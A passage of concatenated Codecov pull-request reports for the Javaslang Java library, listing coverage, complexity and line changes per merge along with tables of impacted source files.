99.81% <\u00f8> (\u00f8) | 257 <\u00f8> (\u00f8) | :x: |\n| ...rc/main/java/javaslang/collection/Traversable.java | 96.53% <100%> (+0.06%) | 103 <3> (+1) | :white_check_mark: |\n| ...rc/main/java/javaslang/collection/Collections.java | 99.29% <100%> (\u00f8) | 76 <4> (\u00f8) | :x: |\n| ...g/src/main/java/javaslang/collection/Iterator.java | 99.82% <100%> (\u00f8) | 173 <1> (\u00f8) | :x: |\n| ...ang/src/main/java/javaslang/collection/Vector.java | 99.68% <100%> (\u00f8) | 209 <5> (\u00f8) | :x: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 8c33457...957af29. Read the comment docs.. # Codecov Report\nMerging #1882 into master will decrease coverage by -0.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1882      +/-\n============================================\n- Coverage     98.08%   98.07%   -0.01%   \n+ Complexity     5054     5051       -3   \n============================================\n  Files            88       88            \n  Lines         11413    11401      -12   \n  Branches       1505     1503       -2   \n============================================\n- Hits          11194    11182      -12   \n  Misses          113      113            \n  Partials        106      106\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...g-test/src/main/java/javaslang/test/Arbitrary.java | 100% <100%> (\u00f8) | 33 <3> (-2) | :x: |\n| ...vaslang-test/src/main/java/javaslang/test/Gen.java | 100% <100%> (\u00f8) | 60 <3> (-1) | :x: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update d61f6a9...df1a881. Read the comment docs.. # Codecov Report\nMerging #1884 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1884   +/-\n=========================================\n  Coverage     98.07%   98.07%         \n  Complexity     5051     5051         \n=========================================\n  Files            88       88         \n  Lines         11401    11401         \n  Branches       1503     1503         \n=========================================\n  Hits          11182    11182         \n  Misses          113      113         \n  Partials        106      106\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 5018059...309bd38. Read the comment docs.. # Codecov Report\nMerging #1887 into master will decrease coverage by -0.02%.\nThe diff coverage is n/a.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1887      +/-\n============================================\n- Coverage     98.09%   98.07%   -0.02%   \n+ Complexity     5052     5051       -1   \n============================================\n  Files            88       88            \n  Lines         11401    11401            \n  Branches       1503     1503            \n============================================\n- Hits          11184    11182       -2   \n- Misses          112      113       +1   \n- Partials        105      106       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/javaslang/concurrent/FutureImpl.java | 83.54% <0%> (-2.54%) | 21% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 2d3db21...67d7e40. Read the comment docs.. # Codecov Report\nMerging #1891 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1891   +/-\n=========================================\n  Coverage     98.07%   98.07%         \n  Complexity     5051     5051         \n=========================================\n  Files            88       88         \n  Lines         11401    11401         \n  Branches       1503     1503         \n=========================================\n  Hits          11182    11182         \n  Misses          113      113         \n  Partials        106      106\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| javaslang/src/main/java/javaslang/Predicates.java | 80% <\u00f8> (\u00f8) | 15 <0> (\u00f8) | :x: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e0d8921...a79a475. Read the comment docs.. # Codecov Report\nMerging #1892 into master will increase coverage by 0.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1892      +/-\n============================================\n+ Coverage     98.07%   98.09%   +0.01%   \n- Complexity     5051     5052       +1   \n============================================\n  Files            88       88            \n  Lines         11401    11401            \n  Branches       1503     1503            \n============================================\n+ Hits          11182    11184       +2   \n+ Misses          113      112       -1   \n+ Partials        106      105       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...aslang/src/main/java/javaslang/collection/Seq.java | 95% <\u00f8> (\u00f8) | 50 <0> (\u00f8) | :x: |\n| ...rc/main/java/javaslang/collection/Traversable.java | 96.53% <\u00f8> (\u00f8) | 103 <0> (\u00f8) | :x: |\n| ...aslang/src/main/java/javaslang/control/Option.java | 100% <\u00f8> (\u00f8) | 42 <0> (\u00f8) | :x: |\n| ...g/src/main/java/javaslang/collection/Multimap.java | 96.61% <\u00f8> (\u00f8) | 26 <0> (\u00f8) | :x: |\n| ...aslang/src/main/java/javaslang/collection/Map.java | 97.91% <\u00f8> (\u00f8) | 32 <0> (\u00f8) | :x: |\n| ...slang/src/main/java/javaslang/collection/Tree.java | 97.78% <\u00f8> (\u00f8) | 113 <0> (\u00f8) | :x: |\n| ...aslang/src/main/java/javaslang/control/Either.java | 100% <\u00f8> (\u00f8) | 38 <0> (\u00f8) | :x: |\n| ...aslang/src/main/java/javaslang/collection/Set.java | 75% <\u00f8> (\u00f8) | 3 <0> (\u00f8) | :x: |\n| javaslang/src/main/java/javaslang/control/Try.java | 94.14% <\u00f8> (\u00f8) | 76 <0> (\u00f8) | :x: |\n| ...ng/src/main/java/javaslang/control/Validation.java | 99.04% <100%> (\u00f8) | 54 <0> (\u00f8) | :x: |\n| ... and 1 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 9524ffc...26b9322. Read the comment docs.. # Codecov Report\nMerging #1894 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1894      +/-\n============================================\n+ Coverage     98.07%   98.07%   +<.01%   \n- Complexity     5051     5052       +1   \n============================================\n  Files            88       88            \n  Lines         11401    11402       +1   \n  Branches       1503     1503            \n============================================\n+ Hits          11182    11183       +1   \n  Misses          113      113            \n  Partials        106      106\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ng/src/main/java/javaslang/collection/CharSeq.java | 100% <100%> (\u00f8) | 344 <1> (+1) | :white_check_mark: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update a9c9ded...7b20c9f. Read the comment docs.. # Codecov Report\nMerging #1895 into master will increase coverage by 0.01%.\nThe diff coverage is n/a.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1895      +/-\n============================================\n+ Coverage     98.07%   98.09%   +0.01%   \n- Complexity     5052     5053       +1   \n============================================\n  Files            88       88            \n  Lines         11402    11402            \n  Branches       1503     1503            \n============================================\n+ Hits          11183    11185       +2   \n+ Misses          113      112       -1   \n+ Partials        106      105       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ng/src/main/java/javaslang/collection/CharSeq.java | 100% <\u00f8> (\u00f8) | 344 <0> (\u00f8) | :x: |\n| ...src/main/java/javaslang/concurrent/FutureImpl.java | 86.07% <0%> (+2.53%) | 22% <0%> (+1%) | :white_check_mark: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update cbdc4e6...9e7b658. Read the comment docs.. # Codecov Report\nMerging #1897 into master will not change coverage.\nThe diff coverage is 100%.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1897   +/-\n=========================================\n  Coverage     98.07%   98.07%         \n  Complexity     5052     5052         \n=========================================\n  Files            88       88         \n  Lines         11402    11402         \n  Branches       1503     1503         \n=========================================\n  Hits          11183    11183         \n  Misses          113      113         \n  Partials        106      106\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ng/src/main/java/javaslang/collection/HashMap.java | 97.56% <\u00f8> (\u00f8) | 121 <0> (\u00f8) | :x: |\n| ...c/main/java/javaslang/collection/RedBlackTree.java | 91.93% <\u00f8> (\u00f8) | 28 <0> (\u00f8) | :x: |\n| ...vaslang/src-gen/main/java/javaslang/Function8.java | 100% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :x: |\n| ...vaslang/src-gen/main/java/javaslang/Function0.java | 100% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :x: |\n| .../main/java/javaslang/collection/LinkedHashSet.java | 96.63% <\u00f8> (\u00f8) | 141 <0> (\u00f8) | :x: |\n| .../src-gen/main/java/javaslang/CheckedFunction8.java | 100% <\u00f8> (\u00f8) | 15 <0> (\u00f8) | :x: |\n| javaslang/src/main/java/javaslang/Value.java | 93.21% <\u00f8> (\u00f8) | 144 <0> (\u00f8) | :x: |\n| ...vaslang/src-gen/main/java/javaslang/Function7.java | 100% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :x: |\n| .../src-gen/main/java/javaslang/CheckedFunction1.java | 100% <\u00f8> (\u00f8) | 19 <0> (\u00f8) | :x: |\n| ...ng/src/main/java/javaslang/collection/TreeSet.java | 100% <\u00f8> (\u00f8) | 169 <0> (\u00f8) | :x: |\n| ... and 30 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 8043332...7a59b94. Read the comment docs.. # Codecov Report\nMerging #1898 into master will not change coverage.\nThe diff coverage is 100%.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1898   +/-\n=========================================\n  Coverage     98.07%   98.07%         \n  Complexity     5052     5052         \n=========================================\n  Files            88       88         \n  Lines         11402    11402         \n  Branches       1503     1503         \n=========================================\n  Hits          11183    11183         \n  Misses          113      113         \n  Partials        106      106\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ng/src/main/java/javaslang/collection/CharSeq.java | 100% <100%> (\u00f8) | 344 <1> (\u00f8) | :x: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 8043332...c70dcbd. Read the comment docs.. # Codecov Report\nMerging #1900 into master will decrease coverage by -0.02%.\nThe diff coverage is 84.61%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1900      +/-\n============================================\n- Coverage     98.07%   98.06%   -0.02%   \n- Complexity     5052     5055       +3   \n============================================\n  Files            88       89       +1   \n  Lines         11402    11406       +4   \n  Branches       1503     1502       -1   \n============================================\n+ Hits          11183    11185       +2   \n- Misses          113      115       +2   \n  Partials        106      106\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...g/src/main/java/javaslang/collection/Multimap.java | 96.61% <\u00f8> (\u00f8) | 26 <0> (\u00f8) | :x: |\n| .../src/main/java/javaslang/collection/SortedMap.java | 66.66% <\u00f8> (\u00f8) | 2 <0> (\u00f8) | :x: |\n| ...main/java/javaslang/collection/SortedMultimap.java | 0% <0%> (\u00f8) | 0 <0> (?) | |\n| ...in/java/javaslang/collection/AbstractMultimap.java | 95.55% <100%> (\u00f8) | 123 <4> (+1) | :white_check_mark: |\n| ...c/main/java/javaslang/collection/TreeMultimap.java | 89.88% <66.66%> (-0.82%) | 10 <2> (+2) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 51d8062...5287cab. Read the comment docs.. # Codecov Report\nMerging #1903 into master will not change coverage.\nThe diff coverage is 100%.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1903   +/-\n=========================================\n  Coverage     98.06%   98.06%         \n  Complexity     5055     5055         \n=========================================\n  Files            89       89         \n  Lines         11406    11406         \n  Branches       1502     1502         \n=========================================\n  Hits          11185    11185         \n  Misses          115      115         \n  Partials        106      106\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ng/src/main/java/javaslang/collection/CharSeq.java | 100% <100%> (\u00f8) | 344 <1> (\u00f8) | :x: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update cad3edd...5cd7540. Read the comment docs.. # Codecov Report\nMerging #1904 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1904      +/-\n============================================\n+ Coverage     98.06%   98.06%   +<.01%   \n  Complexity     5055     5055            \n============================================\n  Files            89       89            \n  Lines         11406    11408       +2   \n  Branches       1502     1503       +1   \n============================================\n+ Hits          11185    11187       +2   \n  Misses          115      115            \n  Partials        106      106\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../main/java/javaslang/collection/BitMappedTrie.java | 100% <100%> (\u00f8) | 72 <1> (\u00f8) | :x: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 4a191b7...187aebd. Read the comment docs.. # Codecov Report\nMerging #1906 into master will decrease coverage by 0.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1906      +/-\n============================================\n- Coverage     98.07%   98.06%   -0.02%   \n- Complexity     5056     5061       +5   \n============================================\n  Files            89       89            \n  Lines         11406    11412       +6   \n  Branches       1502     1502            \n============================================\n+ Hits          11187    11191       +4   \n- Misses          114      115       +1   \n- Partials        105      106       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ang/src/main/java/javaslang/concurrent/Future.java | 99.53% <100%> (+0.01%) | 110 <6> (+6) | :white_check_mark: |\n| ...src/main/java/javaslang/concurrent/FutureImpl.java | 83.54% <0%> (-2.54%) | 21% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 4a191b7...6ad6803. Read the comment docs.. # Codecov Report\nMerging #1907 into master will decrease coverage by 0.03%.\nThe diff coverage is 93.47%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1907      +/-\n============================================\n- Coverage     98.06%   98.03%   -0.04%   \n- Complexity     5061     5062       +1   \n============================================\n  Files            89       89            \n  Lines         11418    11447      +29   \n  Branches       1502     1509       +7   \n============================================\n+ Hits          11197    11222      +25   \n- Misses          115      116       +1   \n- Partials        106      109       +3\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...slang/src/main/java/javaslang/collection/List.java | 99.62% <100%> (-0.19%) | 258 <4> (+1) | |\n| ...g/src/main/java/javaslang/collection/Iterator.java | 99.33% <92.1%> (-0.5%) | 170 <2> (-3) | |\n| .../main/java/javaslang/collection/BitMappedTrie.java | 100% <0%> (\u00f8) | 72% <0%> (\u00f8) | :x: |\n| ...rc/main/java/javaslang/collection/Traversable.java | 96.59% <0%> (+0.05%) | 106% <0%> (+3%) | :white_check_mark: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e2163bb...5f84292. Read the comment docs.. # Codecov Report\nMerging #1909 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1909      +/-\n============================================\n+ Coverage     98.06%   98.06%   +<.01%   \n- Complexity     5061     5064       +3   \n============================================\n  Files            89       89            \n  Lines         11418    11421       +3   \n  Branches       1502     1502            \n============================================\n+ Hits          11197    11200       +3   \n  Misses          115      115            \n  Partials        106      106\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...rc/main/java/javaslang/collection/Traversable.java | 96.59% <100%> (+0.05%) | 106 <3> (+3) | :white_check_mark: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e2163bb...436fe27. Read the comment docs.. # Codecov Report\nMerging #1911 into master will decrease coverage by 0.02%.\nThe diff coverage is 91.66%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1911      +/-\n============================================\n- Coverage     98.06%   98.04%   -0.03%   \n- Complexity     5064     5065       +1   \n============================================\n  Files            89       89            \n  Lines         11423    11453      +30   \n  Branches       1503     1513      +10   \n============================================\n+ Hits          11202    11229      +27   \n+ Misses          115      114       -1   \n- Partials        106      110       +4\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...aslang/src/main/java/javaslang/collection/Set.java | 66.66% <\u00f8> (-8.34%) | 2 <0> (-1) | |\n| ...g/src/main/java/javaslang/collection/Multimap.java | 98.27% <\u00f8> (+1.66%) | 26 <0> (\u00f8) | :x: |\n| ...ng/src/main/java/javaslang/collection/CharSeq.java | 100% <\u00f8> (\u00f8) | 343 <0> (-1) | :x: |\n| ...ang/src/main/java/javaslang/collection/Vector.java | 99.68% <\u00f8> (-0.01%) | 208 <0> (-1) | |\n| ...slang/src/main/java/javaslang/collection/List.java | 99.62% <\u00f8> (-0.19%) | 257 <0> (\u00f8) | |\n| ...lang/src/main/java/javaslang/collection/Queue.java | 95.93% <\u00f8> (-0.02%) | 193 <0> (-1) | |\n| ...lang/src/main/java/javaslang/collection/Array.java | 99.53% <\u00f8> (-0.01%) | 240 <0> (-1) | |\n| ...aslang/src/main/java/javaslang/collection/Map.java | 100% <\u00f8> (+2.08%) | 32 <0> (\u00f8) | :x: |\n| ...ang/src/main/java/javaslang/collection/Stream.java | 98.6% <\u00f8> (-0.01%) | 253 <0> (-1) | |\n| .../main/java/javaslang/collection/PriorityQueue.java | 98.65% <\u00f8> (-0.01%) | 104 <0> (-1) | |\n| ... and 13 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update dc18105...70e74a6. Read the comment docs.. # Codecov Report\nMerging #1913 into master will increase coverage by <.01%.\nThe diff coverage is n/a.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1913      +/-\n============================================\n+ Coverage     98.03%   98.04%   +<.01%   \n- Complexity     5062     5065       +3   \n============================================\n  Files            89       89            \n  Lines         11447    11453       +6   \n  Branches       1509     1513       +4   \n============================================\n+ Hits          11222    11229       +7   \n+ Misses          116      114       -2   \n- Partials        109      110       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...aslang/src/main/java/javaslang/collection/Set.java | 66.66% <0%> (-8.34%) | 2% <0%> (-1%) | |\n| javaslang/src/main/java/javaslang/Value.java | 92.79% <0%> (-0.42%) | 145% <0%> (+1%) | |\n| ...lang/src/main/java/javaslang/collection/Queue.java | 95.93% <0%> (-0.02%) | 193% <0%> (-1%) | |\n| .../main/java/javaslang/collection/PriorityQueue.java | 98.65% <0%> (-0.01%) | 104% <0%> (-1%) | |\n| ...ang/src/main/java/javaslang/collection/Stream.java | 98.6% <0%> (-0.01%) | 253% <0%> (-1%) | |\n| ...g/src/main/java/javaslang/collection/Iterator.java | 99.33% <0%> (-0.01%) | 170% <0%> (\u00f8) | |\n| ...lang/src/main/java/javaslang/collection/Array.java | 99.53% <0%> (-0.01%) | 240% <0%> (-1%) | |\n| ...ang/src/main/java/javaslang/collection/Vector.java | 99.68% <0%> (-0.01%) | 208% <0%> (-1%) | |\n| ...slang/src/main/java/javaslang/collection/List.java | 99.62% <0%> (-0.01%) | 257% <0%> (-1%) | |\n| ...ng/src/main/java/javaslang/collection/CharSeq.java | 100% <0%> (\u00f8) | 343% <0%> (-1%) | :x: |\n| ... and 8 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update c8b67e8...e90a8ec. Read the comment docs.. # Codecov Report\nMerging #1915 into master will decrease coverage by 0.03%.\nThe diff coverage is 85.07%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1915      +/-\n============================================\n- Coverage     98.04%   98.01%   -0.04%   \n- Complexity     5065     5087      +22   \n============================================\n  Files            89       89            \n  Lines         11453    11521      +68   \n  Branches       1513     1512       -1   \n============================================\n+ Hits          11229    11292      +63   \n+ Misses          114      109       -5   \n- Partials        110      120      +10\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ang/src/main/java/javaslang/collection/Stream.java | 98.56% <100%> (-0.04%) | 253 <0> (\u00f8) | |\n| .../main/java/javaslang/collection/LinkedHashSet.java | 96.58% <100%> (-0.08%) | 140 <2> (-2) | |\n| ...ng/src/main/java/javaslang/collection/HashSet.java | 95.72% <100%> (-0.09%) | 135 <2> (-2) | |\n| ...lang/src/main/java/javaslang/collection/Array.java | 99.52% <100%> (-0.01%) | 238 <2> (-2) | |\n| ...ng/src/main/java/javaslang/collection/CharSeq.java | 100% <100%> (\u00f8) | 341 <2> (-2) | :arrow_down: |\n| ...slang/src/main/java/javaslang/collection/List.java | 99.61% <100%> (-0.01%) | 257 <0> (\u00f8) | |\n| ...in/java/javaslang/collection/AbstractMultimap.java | 97.14% <100%> (+1.58%) | 123 <1> (\u00f8) | :arrow_down: |\n| ...ng/src/main/java/javaslang/collection/HashMap.java | 99.37% <100%> (+1.81%) | 121 <2> (\u00f8) | :arrow_down: |\n| ...lang/src/main/java/javaslang/collection/Queue.java | 95.94% <100%> (+0.01%) | 191 <2> (-2) | :arrow_down: |\n| .../main/java/javaslang/collection/LinkedHashMap.java | 98.51% <100%> (+0.93%) | 127 <2> (-1) | :arrow_down: |\n| ... and 11 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 16b3a23...d6bcd05. Read the comment docs.. # Codecov Report\nMerging #1917 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1917   +/-\n=========================================\n  Coverage     98.04%   98.04%         \n  Complexity     5065     5065         \n=========================================\n  Files            89       89         \n  Lines         11453    11453         \n  Branches       1513     1513         \n=========================================\n  Hits          11229    11229         \n  Misses          114      114         \n  Partials        110      110\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 16b3a23...23ca2e5. Read the comment docs.. # Codecov Report\nMerging #1918 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1918   +/-\n=========================================\n  Coverage     98.04%   98.04%         \n  Complexity     5065     5065         \n=========================================\n  Files            89       89         \n  Lines         11453    11453         \n  Branches       1513     1513         \n=========================================\n  Hits          11229    11229         \n  Misses          114      114         \n  Partials        110      110\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 9b1d1f2...89610f2. Read the comment docs.. # Codecov Report\nMerging #1920 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1920      +/-\n============================================\n+ Coverage     98.04%   98.04%   +<.01%   \n- Complexity     5065     5069       +4   \n============================================\n  Files            89       89            \n  Lines         11453    11457       +4   \n  Branches       1513     1513            \n============================================\n+ Hits          11229    11233       +4   \n  Misses          114      114            \n  Partials        110      110\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| javaslang/src/main/java/javaslang/Predicates.java | 84.21% <100%> (+4.21%) | 19 <4> (+4) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update d953425...6068b25. Read the comment docs.. # Codecov Report\nMerging #1921 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1921      +/-\n============================================\n+ Coverage     98.04%   98.04%   +<.01%   \n- Complexity     5065     5069       +4   \n============================================\n  Files            89       89            \n  Lines         11453    11455       +2   \n  Branches       1513     1513            \n============================================\n+ Hits          11229    11231       +2   \n  Misses          114      114            \n  Partials        110      110\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...aslang/src/main/java/javaslang/control/Option.java | 100% <100%> (\u00f8) | 46 <4> (+4) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update d953425...1208983. Read the comment docs.. # Codecov Report\nMerging #1923 into master will decrease coverage by 0.01%.\nThe diff coverage is 91.3%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1923      +/-\n============================================\n- Coverage     98.04%   98.03%   -0.02%   \n- Complexity     5069     5079      +10   \n============================================\n  Files            89       89            \n  Lines         11457    11549      +92   \n  Branches       1513     1521       +8   \n============================================\n+ Hits          11233    11322      +89   \n+ Misses          114      109       -5   \n- Partials        110      118       +8\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| javaslang/src/main/java/javaslang/control/Try.java | 94.94% <91.3%> (+0.8%) | 86 <8> (+10) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e50ddb1...0e34ba3. Read the comment docs.. # Codecov Report\nMerging #1924 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1924      +/-\n============================================\n+ Coverage     98.03%   98.03%   +<.01%   \n- Complexity     5079     5082       +3   \n============================================\n  Files            89       89            \n  Lines         11549    11553       +4   \n  Branches       1521     1522       +1   \n============================================\n+ Hits          11322    11326       +4   \n  Misses          109      109            \n  Partials        118      118\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...rc/main/java/javaslang/collection/Traversable.java | 96.8% <\u00f8> (\u00f8) | 112 <0> (\u00f8) | :arrow_down: |\n| javaslang/src/main/java/javaslang/control/Try.java | 95.01% <100%> (+0.06%) | 89 <3> (+3) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 755355d...8bc2f46. Read the comment docs.. # Codecov Report\nMerging #1926 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1926   +/-\n=========================================\n  Coverage     98.03%   98.03%         \n  Complexity     5082     5082         \n=========================================\n  Files            89       89         \n  Lines         11553    11553         \n  Branches       1522     1522         \n=========================================\n  Hits          11326    11326         \n  Misses          109      109         \n  Partials        118      118\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...rc/main/java/javaslang/collection/Traversable.java | 96.8% <100%> (\u00f8) | 112 <18> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 237a3db...4e2c8ea. Read the comment docs.. # Codecov Report\nMerging #1930 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1930   +/-\n=========================================\n  Coverage     98.03%   98.03%         \n  Complexity     5082     5082         \n=========================================\n  Files            89       89         \n  Lines         11553    11553         \n  Branches       1522     1522         \n=========================================\n  Hits          11326    11326         \n  Misses          109      109         \n  Partials        118      118\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| javaslang/src/main/java/javaslang/control/Try.java | 95.01% <\u00f8> (\u00f8) | 89 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 355bcdd...e8b1b63. Read the comment docs.. # Codecov Report\nMerging #1934 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff            @@\nmaster   #1934   +/-\n========================================\n  Coverage       100%    100%         \n  Complexity      132     132         \n========================================\n  Files             5       5         \n  Lines           749     749         \n  Branches         76      76         \n========================================\n  Hits            749     749\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update df5ea2e...6e70683. Read the comment docs.. # Codecov Report\nMerging #1939 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff            @@\nmaster   #1939   +/-\n========================================\n  Coverage       100%    100%         \n  Complexity      132     132         \n========================================\n  Files             5       5         \n  Lines           749     